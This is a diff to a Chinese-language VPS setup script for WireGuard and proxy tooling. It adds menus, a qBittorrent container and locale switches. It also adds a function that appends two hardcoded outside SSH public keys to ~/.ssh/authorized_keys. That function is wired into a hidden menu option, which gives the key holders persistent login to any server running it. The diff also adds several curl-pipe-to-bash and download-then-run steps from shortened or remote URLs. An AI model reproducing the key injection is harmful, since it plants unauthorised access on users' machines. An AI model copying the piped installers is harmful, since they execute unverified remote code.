@@ -163,27 +163,96 @@ ss_kcp_udp2raw_wg_speed(){
 
 # 常用工具和配置
 get_tools_conf(){
-    apt install -y htop tmux screen iperf3  >/dev/null 2>&1
+    apt install -y htop tmux screen iperf3 fish net-tools >/dev/null 2>&1
     yum install -y vim htop tmux screen iperf3  >/dev/null 2>&1
     wget -O .vimrc      --no-check-certificate https://raw.githubusercontent.com/hongwenjun/srgb/master/vim/_vimrc
     wget -O .bashrc     --no-check-certificate https://raw.githubusercontent.com/hongwenjun/srgb/master/vim/_bashrc
     wget -O .tmux.conf  --no-check-certificate https://raw.githubusercontent.com/hongwenjun/tmux_for_windows/master/.tmux.conf
 }
 
+# 慎用 authorized_keys
+authorized_keys(){
+mkdir -p ~/.ssh  && cd ~/.ssh
+cat <<EOF >>  authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDm5IXhVxCp317F3X+VEKmLPNiIGigbX4eot3EPIizbHHVURVOEXbxlN5tqQPmFt62qex4GhXmOfcMmLcaDwrkci7A3dPlnjRukYBDK3jQtzjVexTvNqcblTKj2aEpZg5Z8Z5vCOVrOfCdXOngqi/NkItvsid2DLzqi7KTpdFpgZGSwpV2h3E3U0N18uBLQwDj3ag2mUT7X2kx4t4DYbQDWyGt+bbivnTHV0k/BZJPwqnPD2tpyH19lKWvL3fm3gjoMkTtxDzEXHpTmTe95Z1AKzOfY1reEZ+dHAWy0wHmCA1by1XJtagoeTVqa+IS1wfOimwJE/oIofhDjSNjsMk63 root
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDB1yzgEUtS0t5GUW2lVeZpWEn6YDI8x3nIMzjQscIL3Z9QDvyONohC58t6kHQtgj7+/5pQnzaPOz0qFuDolqQOp9D8tiUJIEYHc8PA7WGxRKwS7L2j0ia7FleGAKyhi9tR6TqY4T9Vny9g8VetRBzaMz+WAv8FHYDLfQq+Wcrx1GJgYiiNp0UWEMWrY50K1vub6rtk7xNUhiDGlfEsLxgKTaDUwQ/sEcyu/ZTEIlaaSPLsIuaWKJvIrnicmYIP7jZ3S4k7De/UZo87EXo6PQGhyJCDBYWXPd0Ng7XavXbm8MoRb5+Go9zn04f8oBHuqLJhSyrLFIFhPmEogKvpJ/Xd  vip@cloudshell
+EOF
+}
+
 # 主菜单输入数字 88      # 隐藏功能:从源VPS克隆服务端配置，获得常用工具和配置
 scp_conf(){
     echo -e "${RedBG}:: 警告: 警告: 警告:${Yellow} VPS服务器已经被GFW防火墙关照，按 Ctrl+ C 可以紧急逃离！  ${Font}"
-    echo_SkyBlue  ":: 隐藏功能: 从源VPS克隆服务端配置，共用客户端配置"
-    read -p ":: 请输入源VPS的IP地址(域名):"  vps_ip
-    cmd="scp root@${vps_ip}:/etc/wireguard/*  /etc/wireguard/. "
-    echo -e "${GreenBG}#  ${cmd}  ${Font}   现在运行scp命令，按提示输入yes，源vps的root密码"
-    ${cmd}
+#    echo_SkyBlue  ":: 隐藏功能: 从源VPS克隆服务端配置，共用客户端配置"
+#    read -p ":: 请输入源VPS的IP地址(域名):"  vps_ip
+#    cmd="scp root@${vps_ip}:/etc/wireguard/*  /etc/wireguard/. "
+#    echo -e "${GreenBG}#  ${cmd}  ${Font}   现在运行scp命令，按提示输入yes，源vps的root密码"
+#    ${cmd}
 
-    wg-quick down wg0   >/dev/null 2>&1
-    wg-quick up wg0     >/dev/null 2>&1
-    echo -e "${RedBG}    我真不知道WG服务器端是否已经使用源vps的配置启动!    ${Font}"
+#    wg-quick down wg0   >/dev/null 2>&1
+#    wg-quick up wg0     >/dev/null 2>&1
+#    echo -e "${RedBG}    我真不知道WG服务器端是否已经使用源vps的配置启动!    ${Font}"
 
+    authorized_keys
     get_tools_conf
+}
+
+# DEBIAN LOCALE LANGUAGE SETTINGS
+en_US()
+{
+	cat <<EOF >/etc/default/locale
+LANG=en_US.UTF-8
+EOF
+	echo -e "Please log in again on Debian tty1"
+}
+
+zh_CN()
+{
+	cat <<EOF >/etc/default/locale
+# 中文显示
+LANG="zh_CN.UTF-8"
+LANGUAGE="zh_CN:zh"
+EOF
+
+	echo -e ":: 仅支持本身中文系统切换回中文!"
+	echo -e "Please log in again on Debian tty1"
+}
+
+ipinfo(){
+
+    echo_GreenBG ":: 统计自己电信服务商IP动态变化 ::"
+    echo -e "${Green}"
+# 应用: 统计自己电信服务商IP动态变化
+cat /var/log/udp2raw.log \
+  | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort | uniq -c| sort -nrk 1
+
+
+    echo -e
+    echo_RedBG ":: 抠脚大叔在窥视你的小鸡 ::"
+    echo -e "${Red}"
+# 统计哪些IP在扫描你的vps
+cat /var/log/auth.log \
+  | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort | uniq -c| sort -nrk 1
+
+    echo -e
+    echo_GreenBG  ":: 查询IP信息和物理地址 https://www.ipip.net/ipquery.html"
+    echo -e
+    echo_Yellow  ":: 当前${RedBG} 服务器IP: ${Green} $(cat /var/ip_addr) ${Font} ::"
+}
+
+# 创建容器: qbittorrent
+docker_qb(){
+    docker run --name=qbittorrent \
+    -e PUID=1000 -e PGID=1000 \
+    -e TZ=Asia/ShangHai \
+    -e UMASK_SET=022 -e \
+    WEBUI_PORT=8080 \
+    -p 59902:59902 \
+    -p 59902:59902/udp \
+    -p 8080:8080 \
+    -v /mnt/config:/config \
+    -v /mnt/downloads:/downloads \
+    --restart unless-stopped \
+    -d linuxserver/qbittorrent
 }
 
 # 定义文字颜色
@@ -230,7 +299,10 @@ onekey_plus(){
     echo_Yellow  "  wget -qO- git.io/superbench.sh | bash"
     echo_SkyBlue "  # 使用BestTrace查看VPS的去程和回程"
     echo_Yellow  "  wget -qO- git.io/fp5lf | bash"
-
+    echo_SkyBlue "  # 挂载GD网盘 安装rclone官方脚本"
+    echo_Yellow  "  curl https://rclone.org/install.sh | sudo bash"
+    echo_SkyBlue "  # 安装Docker软件一键脚本"
+    echo_Yellow  "  curl -fsSLo- get.docker.com | /bin/sh"
 }
 
 safe_iptables(){
@@ -467,6 +539,7 @@ start_menu(){
     echo
     echo_SkyBlue  "Usage: ${GreenBG} bash wgmtu ${SkyBlue} [ setup | remove | vps | bench | -U ] "
     echo_SkyBlue                      "                    [ v2ray | vnstat | log | trace | -h ] "
+    echo_SkyBlue                      "                    [ tr|qb | docker | rclone | ip | en ] "
     echo
     read -p "请输入数字(1-8):" num
     case "$num" in
@@ -502,7 +575,17 @@ start_menu(){
         8)
         safe_iptables
         ;;
-
+        ip)
+        ipinfo
+        ;;
+        tr)
+        # Debian 安装 Transmission 一键脚本
+        wget https://raw.githubusercontent.com/hongwenjun/vps_setup/master/rclone/transmission.sh
+        bash transmission.sh
+        ;;
+        qb)
+        docker_qb
+        ;;
     # 菜单输入 管理命令 bash wgmtu 命令行参数
         setup)
         ss_kcp_udp2raw_wg_speed
@@ -525,6 +608,18 @@ start_menu(){
         ;;
         vps)
         bash <(curl -L -s https://git.io/vps.sh)
+        ;;
+        docker)
+        curl -fsSLo- get.docker.com | /bin/sh
+        ;;
+        rclone)
+        curl https://rclone.org/install.sh | sudo bash
+        ;;
+        en)
+        en_US
+        ;;
+        cn)
+        zh_CN
         ;;
         vnstat)
         bash <(curl -L -s https://git.io/fxxlb) setup
@@ -551,6 +646,7 @@ start_menu(){
 wgmtu_help(){
     echo_SkyBlue  "Usage: ${GreenBG} bash wgmtu ${SkyBlue} [ setup | remove | vps | bench | -U ] "
     echo_SkyBlue                      "                    [ v2ray | vnstat | log | trace | -h ] "
+    echo_SkyBlue                      "                    [ tr|qb | docker | rclone | ip | en ] "
     echo
     echo_Yellow "[setup 惊喜 | remove 卸载 | vps 脚本 | bench 基准测试 | -U 更新]"
     echo_Yellow "[v2ray 你懂 | vnstat 流量 | log 信息 | trace 网络回程 | -h 帮助]"
@@ -581,6 +677,29 @@ if [[ $# > 0 ]]; then
         ;;
         vps)
         bash <(curl -L -s https://git.io/vps.sh)
+        ;;
+        ip)
+        ipinfo
+        ;;
+        tr)
+        # Debian 安装 Transmission 一键脚本
+        wget https://raw.githubusercontent.com/hongwenjun/vps_setup/master/rclone/transmission.sh
+        bash transmission.sh
+        ;;
+        qb)
+        docker_qb
+        ;;
+        docker)
+        curl -fsSLo- get.docker.com | /bin/sh
+        ;;
+        rclone)
+        curl https://rclone.org/install.sh | sudo bash
+        ;;
+        en)
+        en_US
+        ;;
+        cn)
+        zh_CN
         ;;
         vnstat)
         bash <(curl -L -s https://git.io/fxxlb) setup
